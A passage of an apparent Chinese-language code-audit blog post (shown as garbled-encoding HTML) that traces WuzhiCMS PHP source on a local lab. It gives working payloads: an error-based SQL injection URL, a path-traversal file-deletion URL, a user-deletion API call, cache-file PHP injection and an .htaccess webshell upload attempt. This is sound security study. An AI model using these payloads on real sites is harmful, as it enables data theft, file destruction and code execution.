class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>           <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>           <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>           <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>           <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>           <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>           <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>           <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>       &#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç›´æ¥å…¨å±€æœç´¢æ˜¯ä¸æ˜¾ç¤ºçš„ï¼Œå…¨å±€æœç´¢æ—¶å¯ä»¥çœ‹åˆ°åªæ˜¾ç¤ºåˆ°coreframe&#x2F;app&#x2F;payç›®å½•ï¼Œå‰©ä¸‹çš„éœ€è¦æ‰‹åŠ¨æŸ¥æ‰¾</p><p>ç›´æ¥æœç´¢urlï¼Œå‘ç°æœ‰æŠ¥é”™æç¤º</p><p><img src="/img/wuzhicms/w14.png"></p><p>åŒæ ·ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost/wuzhicms/www/index.php?m=promote&amp;f=index&amp;v=search&amp;_su=wuzhicms&amp;fieldtype=place&amp;keywords=1%25%27+or+1%3dextractvalue(1%2cconcat(0x7e%2c(<span class="hljs-keyword">select</span>+database())))+%23<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w15.png"></p><h4 id="åå°ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#åå°ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="åå°ä»»æ„æ–‡ä»¶åˆ é™¤"></a>åå°ä»»æ„æ–‡ä»¶åˆ é™¤</h4><p>æœç´¢unlinkå…³é”®å­—</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><p>del()æ–¹æ³•å¯¹ç”¨æˆ·ä¼ å…¥çš„urlå‚æ•°æ— è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>                <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<br>                <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åœ¨Dç›˜ä¸‹æ”¾ä¸€ä¸ª1.txtæ–‡ä»¶</p><p>ç½‘ç«™wwwç›®å½•è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:/phpstudy_pro/WWW/wuzhicms/www/uploadfile<br></code></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=attachment&amp;f=index&amp;_su=wuzhicms&amp;v=del&amp;url=http://localhost/wuzhicms/www/uploadfile/../../../../../1.txt<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œåå¯ä»¥çœ‹åˆ°1.txtæ–‡ä»¶é¡ºåˆ©è¢«åˆ é™¤</p><p><img src="/img/wuzhicms/w16.png"></p><p>åœ¨Dç›˜æ–‡ä»¶ç›®å½•ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°æ˜¯è¢«åˆ é™¤çš„</p><h4 id="é€»è¾‘æ¼æ´"><a href="#é€»è¾‘æ¼æ´" class="headerlink" title="é€»è¾‘æ¼æ´"></a>é€»è¾‘æ¼æ´</h4><p>www&#x2F;api&#x2F;uc.php</p><p><img src="/img/wuzhicms/w17.png"></p><p><img src="/img/wuzhicms/w18.png"></p><p>å¯ä»¥å°†uc_noteç±»ä¸­çš„æ–¹æ³•åä¼ å…¥actionä¸­è°ƒç”¨æ–¹æ³•ï¼Œæ­¤ç±»ä¸­æœ‰æ›´æ”¹ç”¨æˆ·åï¼Œæ›´æ”¹ç”¨æˆ·å¯†ç ï¼Œåˆ é™¤ç”¨æˆ·ç­‰æ–¹æ³•</p><p>æ­¤æ–‡ä»¶æ˜¯å¯ä»¥è®¿é—®çš„</p><p>æ„é€ url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/api/uc.php?action=deleteuser&amp;ids=2<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w19.png"></p><p>æ˜¾ç¤ºæ— æ•ˆè¯·æ±‚</p><h4 id="åå°æ–‡ä»¶ä¸Šä¼ "><a href="#åå°æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="åå°æ–‡ä»¶ä¸Šä¼ "></a>åå°æ–‡ä»¶ä¸Šä¼ </h4><p>æœç´¢file_put_contentså…³é”®å­—æ—¶å‘ç°</p><p>coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;/r/n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ˜¯å¦æœ‰æ–¹æ³•è°ƒç”¨ï¼Œæ–¹æ³•ä¸­$dataæ˜¯å¦èƒ½ä½œä¸ºå¯æ§å˜é‡</p><p>å…¨å±€æœç´¢å…³é”®å­—set_cache</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><p>setæ–¹æ³•è°ƒç”¨äº†æ­¤å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>            <span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>]);<br>            <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$show_dialog</span> = <span class="hljs-number">1</span>;<br>            <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br>            <span class="hljs-variable">$setting</span> = &amp;<span class="hljs-variable language_">$this</span>-&gt;_cache;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$setting</span>[<span class="hljs-string">&#x27;show_mode&#x27;</span>])) &#123;<br><span class="hljs-variable">$setting</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;show_mode&#x27;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;watermark_enable&#x27;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;watermark_pos&#x27;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;watermark_text&#x27;</span>=&gt;<span class="hljs-string">&#x27;www.wuzhicms.com&#x27;</span>);<br><span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$setting</span>);<br>&#125;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;set&#x27;</span>, M);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ å…¥settingçš„å€¼å³å¯</p><p>è®¿é—®urlæŠ“å–æ•°æ®åŒ…</p><p><img src="/img/wuzhicms/w20.png"></p><p>æœ‰å…ˆå‰çš„set_cacheæ–¹æ³•å¯çŸ¥ï¼Œæ–‡ä»¶åœ¨cache&#x2F;_ cache_ç›®å½•ä¸‹ï¼Œé€šè¿‡æ­¤æ•°æ®åŒ…å¯ä»¥çœ‹åˆ°watermarkçš„åç§°</p><p><img src="/img/wuzhicms/w21.png"></p><p>å¯ä»¥ç¡®å®šæ•°æ®ä¸Šä¼ åä¿å­˜åœ¨caches&#x2F;<em>cache</em>&#x2F;attachment.YGzFh.phpè·¯å¾„ä¸‹</p><p>ä¿®æ”¹æ•°æ®åŒ…</p><p><img src="/img/wuzhicms/w22.png"></p><p>é¡ºåˆ©ä¸Šä¼ </p><p><img src="/img/wuzhicms/w23.png"></p><p>ç”±äºæ˜¯ç¼“å­˜æ–‡ä»¶ï¼Œé‡å¯æœåŠ¡å™¨å°±ä¼šå¤±æ•ˆ</p><h4 id="åå°æ–‡ä»¶ä¸Šä¼ -æœªæˆåŠŸ"><a href="#åå°æ–‡ä»¶ä¸Šä¼ -æœªæˆåŠŸ" class="headerlink" title="åå°æ–‡ä»¶ä¸Šä¼ (æœªæˆåŠŸ)"></a>åå°æ–‡ä»¶ä¸Šä¼ (æœªæˆåŠŸ)</h4><p><a href="https://www.freebuf.com/articles/web/328241.html">æ–‡ä»¶ä¸Šä¼ ä¹‹.htaccessçš„ä¸€äº›æŠ€å·§ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p>åœ¨å¯»æ‰¾åŠŸèƒ½ç‚¹æ—¶å‘ç°ç®¡ç†ä¸­å¿ƒ-&gt;ç®¡ç†ä¼šå‘˜-&gt;ä¸Šä¼ å¤´åƒæœ‰æ–‡ä»¶ä¸Šä¼ </p><p>æŠ“åŒ…æŸ¥çœ‹è·¯ç”±</p><p><img src="/img/wuzhicms/w06.png"></p><p>æ‰¾åˆ°æ§åˆ¶ä»£ç </p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;index.php -&gt;h5upload()æ–¹æ³•</p><p><img src="/img/wuzhicms/w07.png"></p><p>å‘ç°æ˜¯ä¸€ä¸ªé»‘åå•éªŒè¯</p><p>è·Ÿè¿›filenameæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filename</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$_exts</span> =  <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;asp&#x27;</span>,<span class="hljs-string">&#x27;jsp&#x27;</span>,<span class="hljs-string">&#x27;jspx&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;aspx&#x27;</span>,<span class="hljs-string">&#x27;asa&#x27;</span>,<span class="hljs-string">&#x27;cs&#x27;</span>,<span class="hljs-string">&#x27;cgi&#x27;</span>,<span class="hljs-string">&#x27;js&#x27;</span>,<span class="hljs-string">&#x27;dhtml&#x27;</span>,<span class="hljs-string">&#x27;xhtml&#x27;</span>,<span class="hljs-string">&#x27;vb&#x27;</span>,<span class="hljs-string">&#x27;exe&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;pthml&#x27;</span>,<span class="hljs-string">&#x27;cdx&#x27;</span>,<span class="hljs-string">&#x27;cer&#x27;</span>);<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>,PATHINFO_EXTENSION));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$_exts</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-variable">$rand_str</span> = <span class="hljs-title function_ invoke__">random_string</span>(<span class="hljs-string">&#x27;diy&#x27;</span>, <span class="hljs-number">6</span>,<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>);<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;YmdHis&#x27;</span>).<span class="hljs-variable">$rand_str</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$files</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°å¹¶æ²¡æœ‰ç¦æ­¢.htaccessåç¼€æ–‡ä»¶ä¸Šä¼ </p><p>å°è¯•ä¸Šä¼ å›¾ç‰‡é©¬å†è§£æ</p><p>psï¼šè¿™é‡Œé»‘åå•ç»•è¿‡ä¸Šä¼ phpæ–‡ä»¶æ˜¯ä¸å¯ä»¥çš„ï¼Œä¹‹å‰åœ¨å®‰è£…è¯´æ˜å¤„çœ‹åˆ°uploadfileæ–‡ä»¶ä¸‹çš„phpæ–‡ä»¶æ˜¯ç¦æ­¢è¿è¡Œçš„</p><p>æŠ“åŒ…ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p><p><img src="/img/wuzhicms/w08.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯æ²¡æœ‰æ–‡ä»¶å†…å®¹æ£€æµ‹å’ŒMIMEæ£€æµ‹çš„ï¼ŒæˆåŠŸä¸Šä¼ </p><p>ä¸Šä¼ .htaccessæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;FilesMatch <span class="hljs-string">&quot;/.png&quot;</span>&gt;<br>  SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w09.png"></p><p>åŒæ ·å¯ä»¥çœ‹åˆ°æ˜¯æˆåŠŸä¸Šä¼ çš„</p><p>ä½†æ˜¯ä¸Šä¼ åæ˜¯æ— æ³•æŒ‰ç…§é¢„æƒ³ä¸­æ‰§è¡Œçš„ï¼Œæ–‡ä»¶ä¸Šä¼ ä¹‹åè¢«é‡å‘½åæ— æ³•æ›´æ”¹ï¼Œä½†æ˜¯apacheæ™ºæ…§æŸ¥æ‰¾.htaccesså¹¶æ‰§è¡Œ</p><p>å¹¶ä¸”æ‰§è¡Œ.htaccessæ–‡ä»¶éœ€è¦apache httpd.confæ–‡ä»¶ä¸­AllowOverrideå€¼ä¸ºAllï¼Œé»˜è®¤æ˜¯noneï¼Œè¿™ä¸ªè¦çœ‹è¿æ°”</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li>ç¿»çœ‹ç›®å½•å¼„æ¸…æ¥šç»“æ„ï¼Œæ‰¾åˆ°æ§åˆ¶å™¨</li><li>å®‰è£…ç³»ç»ŸæŸ¥çœ‹ä½¿ç”¨çš„ä¾èµ–ï¼Œæ¨¡æ¿</li><li>åˆ¤æ–­æ­£å¸¸çš„ä¼ å€¼ï¼Œå‚æ•°å…³ç³»ï¼Œè·¯ç”±å…³ç³»</li><li>æœç´¢å…³é”®å­—ï¼Œæ‰¾æ•æ„Ÿå‡½æ•°ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯æ§å˜é‡ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰åˆ©ç”¨ç‚¹(æ˜¯å¦æœ‰æ§åˆ¶å™¨ä¸­æ–¹æ³•è°ƒç”¨ï¼Œèƒ½ä¼ å‚)</li></ol>]]></content>
    
    
    <categories>
      
      <category>phpä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMS</tag>
      
      <tag>phpä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡ä¸­çš„SSTI</title>
